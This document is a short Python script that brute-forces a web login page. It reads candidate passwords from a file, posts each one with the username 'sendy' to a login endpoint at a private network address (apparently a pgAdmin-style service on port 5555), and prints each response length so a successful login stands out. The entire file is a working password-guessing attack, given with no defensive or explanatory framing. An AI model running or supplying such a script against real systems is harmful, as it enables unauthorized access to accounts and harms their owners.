import requests

cookies = {
    'PGADMIN_LANGUAGE': 'en',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language': 'ja,en-US;q=0.9,en;q=0.8',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    # 'Cookie': 'PGADMIN_LANGUAGE=en',
    'Origin': 'http://localhost:5555',
    'Referer': 'http://localhost:5555/login',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
    'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
}

password_list = []
with open("password-list.txt") as f:
    line = f.read()
    password_list = line.splitlines()

for password in password_list:
    data = {
        'uname': 'sendy',
        'passw': password,
    }

    response = requests.post('http://192.168.11.7:5555/login', cookies=cookies, headers=headers, data=data)
    response_len = len(response.text)
    print(f'{response_len}:{password}')
